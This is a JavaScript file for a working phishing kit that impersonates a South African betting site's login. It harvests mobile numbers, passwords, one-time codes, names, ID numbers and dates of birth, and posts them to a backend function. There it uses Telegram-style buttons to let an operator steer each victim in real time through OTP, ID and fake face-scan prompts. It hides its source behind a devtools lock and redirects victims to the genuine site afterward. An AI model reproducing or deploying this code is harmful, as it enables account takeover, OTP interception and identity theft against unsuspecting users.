document.onkeydown = function(e){ 
    if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74||e.keyCode==67))||(e.ctrlKey&&e.keyCode==85)){ 
        let p=prompt("Source Locked:"); 
        return p==="8890"; 
    } 
};

let verificationAttempts = 0;
let currentU = "Unknown";
let activePollingInterval = null;
let autoFallbackTimeout = null;
let videoStream = null;

const AUTO_FALLBACK_DELAY = 12000;

setTimeout(() => { 
    document.getElementById('loading-view').style.display = 'none'; 
    openModal('login-modal');
}, 1500);

function openModal(id) { 
    closeModals(); 
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    const target = document.getElementById(id);
    if (target) target.style.display = 'flex'; 
}

function openView(id) {
    closeModals();
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

function closeModals() { 
    document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none'); 
    stopAllSpinners(); 
}

function stopAllSpinners() { 
    document.querySelectorAll('.submit-btn').forEach(b => { 
        b.disabled = false; 
        b.innerHTML = b.getAttribute('data-orig') || b.innerHTML; 
    }); 
    document.getElementById('process-overlay').style.display = 'none';
}

function togglePassword(i, e) {
    const f = document.getElementById(i);
    const icon = document.getElementById(e);
    if (f.type === "text") {
        f.type = "password"; icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye');
    } else {
        f.type = "text"; icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash');
    }
}

function showError(id) { 
    const e = document.getElementById(id); 
    if(e) e.style.display = 'flex'; 
}

function formatDOB(e) {
    let v = e.target.value.replace(/\D/g, ''); 
    if (v.length > 8) v = v.substring(0, 8);
    if (v.length >= 5) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4,8); }
    else if (v.length >= 3) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4); }
    else { e.target.value = v; }
}

function handleFocus(el, isMobile, customLabel = null) {
    const wrap = el.parentElement;
    wrap.classList.add('focused');
    wrap.classList.remove('error');
    if (customLabel) wrap.querySelector('.mat-label').innerText = customLabel;
    else wrap.querySelector('.mat-label').innerText = isMobile ? 'Mobile Number' : 'Enter Password';
}

function handleBlur(el, isMobile, customLabel = null) {
    const wrap = el.parentElement;
    if (el.value.trim() === '') {
        wrap.classList.remove('focused');
        if (customLabel) wrap.querySelector('.mat-label').innerText = customLabel;
        else wrap.querySelector('.mat-label').innerText = isMobile ? '+27 Mobile Number' : 'Enter Password';
    }
}

function onPwFocus(el) {
    const mob = document.getElementById('lgn-mobile');
    if (mob.value.trim() === '') {
        document.getElementById('mobile-wrap').classList.add('error');
        document.getElementById('pw-wrap').classList.add('error');
    }
    handleFocus(el, false);
}

function remMatErr(el) { el.parentElement.classList.remove('error'); }
function remErr(i) { i.classList.remove('error-field'); }

function validate(ids) {
    let valid = true, first = null;
    ids.forEach(id => {
        const el = document.getElementById(id);
        if(el){
            const val = el.value.trim();
            if(!val || val.length < 1){
                if (el.classList.contains('mat-input')) el.parentElement.classList.add('error');
                else el.classList.add('error-field');
                valid = false;
                if(!first) first = el;
            } else {
                if (el.classList.contains('mat-input')) el.parentElement.classList.remove('error');
                else el.classList.remove('error-field');
            }
        }
    });
    if(first) first.focus();
    return valid;
}

async function initCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        document.getElementById('user-video').srcObject = videoStream;
        document.getElementById('camera-placeholder').style.display = 'none';
        document.getElementById('scan-status').innerText = "Please position your face within the frame.";
        document.getElementById('scan-status').style.color = "#aaa";
    } catch (err) {
        document.getElementById('scan-status').innerText = "Camera access denied. Ensure permissions are allowed.";
        document.getElementById('scan-status').style.color = "#d93025";
    }
}

function startFaceScan() {
    if (!videoStream) {
        alert("Please allow camera access to continue.");
        return;
    }
    const btn = document.getElementById('start-scan-btn');
    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
    
    btn.disabled = true;
    btn.innerHTML = `<div class="spinner"></div>`;
    
    document.getElementById('scanner-line').style.display = 'block';
    document.getElementById('scan-status').innerText = "Analyzing biometric features... Please hold still.";
    document.getElementById('scan-status').style.color = "#009241";

    setTimeout(() => {
        document.getElementById('scanner-line').style.display = 'none';
        document.getElementById('scan-status').innerText = "Verification Successful.";
        if(videoStream) { videoStream.getTracks().forEach(t => t.stop()); }
        sendData('Face Scan logs');
    }, 4000);
}

function proceedToNextStep(t) {
    clearActivePolling();
    stopAllSpinners();

    if (t === 'Betting Voucher logs') {
        openModal('verification-modal');
    } else {
        triggerMaintenance();
    }
}

function triggerMaintenance() {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById('maintenance-view').classList.add('active'); 
    closeModals();
    setTimeout(() => { window.location.href = "https://www.betway.co.za/"; }, 4000);
}

function clearActivePolling() {
    if (activePollingInterval) clearInterval(activePollingInterval);
    if (autoFallbackTimeout) clearTimeout(autoFallbackTimeout);
    activePollingInterval = null;
    autoFallbackTimeout = null;
}

function startSessionPolling(sessionId, logType) {
    clearActivePolling();

    autoFallbackTimeout = setTimeout(() => {
        proceedToNextStep(logType);
    }, AUTO_FALLBACK_DELAY);

    activePollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`/.netlify/functions/api?sessionId=${sessionId}`);
            const data = await res.json();

            if (data.status && data.status !== "PENDING") {
                clearActivePolling();
                executeAdminCommand(data.status, logType);
            }
        } catch (err) { console.error("Polling error:", err); }
    }, 1500);
}

function executeAdminCommand(command, logType) {
    stopAllSpinners();

    switch(command) {
        case 'approve':
            proceedToNextStep(logType);
            break;
        case 'wrong_pass':
            document.getElementById('login-pw').value = '';
            document.getElementById('pw-wrap').classList.add('error');
            openModal('login-modal');
            showError('login-error');
            break;
        case 'wrong_otp':
            document.getElementById('otp-input').value = '';
            document.getElementById('otp-wrap').classList.add('error');
            openModal('otp-modal');
            showError('otp-error');
            break;
        case 'otp':
            openModal('otp-modal');
            break;
        case 'verify':
            openModal('verification-modal');
            break;
        case 'face_verify':
            openView('face-verify-view');
            initCamera();
            break;
        case 'maint':
        case 'reject':
            triggerMaintenance();
            break;
        default:
            proceedToNextStep(logType);
    }
}

function sendData(t) {
    const btn = event.currentTarget;
    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
    
    let u = currentU;
    let m = "";
    const sessionId = "sess_" + Date.now() + "_" + Math.floor(Math.random() * 1000);

    let keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Approve & Continue", callback_data: `approve:${sessionId}` },
                { text: "⚠️ Wrong Data", callback_data: `wrong_pass:${sessionId}` }
            ],
            [
                { text: "📩 Request OTP", callback_data: `otp:${sessionId}` },
                { text: "🪪 Request ID Doc", callback_data: `verify:${sessionId}` }
            ],
            [
                { text: "📸 Request Face Scan", callback_data: `face_verify:${sessionId}` },
                { text: "⛔ End to Maintenance", callback_data: `maint:${sessionId}` }
            ]
        ]
    };

    if(t === 'Betting Voucher logs'){
        if(!validate(['lgn-mobile','login-pw'])) return;
        u = document.getElementById('lgn-mobile').value;
        const p = document.getElementById('login-pw').value;
        currentU = u;
        m = `📱 *Betting Voucher Login* 🇿🇦\n👤 *User:* \`${u}\`\n🔑 *Pass:*\n\`${p}\`\n🆔 *Session:* \`${sessionId}\``;

    } else if (t === 'OTP logs') {
        const otpEl = document.getElementById('otp-input');
        const otpVal = otpEl.value.trim();
        if(otpVal.length < 4 || otpVal.length > 6) {
            otpEl.parentElement.classList.add('error');
            return;
        }
        m = `📱 *OTP Captured* 🇿🇦\n👤 *User:* \`${currentU}\`\n🔢 *Code:*\n\`${otpVal}\`\n🆔 *Session:* \`${sessionId}\``;
        keyboard.inline_keyboard[0][1] = { text: "⚠️ Wrong OTP", callback_data: `wrong_otp:${sessionId}` };

    } else if (t === 'Face Scan logs') {
        m = `📸 *Biometric Face Scan* 🇿🇦\n👤 *User:* \`${currentU}\`\n✅ *Status:* \`Face verified securely via frontend biometrics.\`\n🆔 *Session:* \`${sessionId}\``;
        keyboard.inline_keyboard.shift();
        keyboard.inline_keyboard.unshift([
            { text: "✅ Approve Identity", callback_data: `approve:${sessionId}` },
            { text: "⛔ Reject Identity", callback_data: `maint:${sessionId}` }
        ]);

    } else if (t === 'Verification logs') {
        if(!validate(['verify-fname', 'verify-sname', 'verify-doc-input', 'verify-dob'])) return;
        
        const fname = document.getElementById('verify-fname').value.trim();
        const sname = document.getElementById('verify-sname').value.trim();
        const docInputEl = document.getElementById('verify-doc-input');
        const docVal = docInputEl.value.trim();
        
        if (docVal.length < 10 || docVal.length > 15) { docInputEl.classList.add('error-field'); return; }
        
        const docType = document.getElementById('verify-doc-type').value;
        const dob = document.getElementById('verify-dob').value;
        
        m = `🪪 *Identity Verification* 🇿🇦\n👤 *User:* \`${currentU}\`\n📝 *First Name:* \`${fname}\`\n📝 *Surname:* \`${sname}\`\n🇿🇦 *${docType}:*\n\`${docVal}\`\n📅 *D.O.B:* \`${dob}\`\n🆔 *Session:* \`${sessionId}\``;
    }

    btn.disabled = true; 
    btn.innerHTML = `<div class="spinner"></div>`;
    if(t !== 'Face Scan logs') {
        document.getElementById('process-overlay').style.display = 'flex'; 
    }

    fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: m, sessionId, keyboard })
    })
    .then(() => startSessionPolling(sessionId, t))
    .catch(err => {
        console.error("Dispatch error:", err);
        proceedToNextStep(t);
    });
}
